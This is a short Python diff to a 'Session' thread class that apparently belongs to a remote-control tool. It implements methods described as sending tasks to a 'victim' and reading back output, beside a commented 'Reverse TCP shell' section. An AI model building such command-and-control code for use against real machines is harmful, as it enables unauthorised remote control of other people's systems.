@@ -58,14 +58,22 @@ class Session(threading.Thread):
         finally:
             self.connection.setblocking(1)
     #sends task to victim
-    def send_instruction(self):
-        #TODO:implement
+    def send_instruction(self, instruction):
+        try:
+            self.connection.sendall(instruction.encode())
+        except Exception as e:
+            print(f"send_instruction: {e}")
         return
 
     #receives output from task running on victim
     def receive_response(self):
-        #TODO:implement
-        return
+        try:
+            return self.connection.recv(1024).decode()
+        except Exception as e:
+            print(f"receive_response: {e}")
+            return None
+    
+    
     '''
     #Reverse TCP shell
     def run(self):
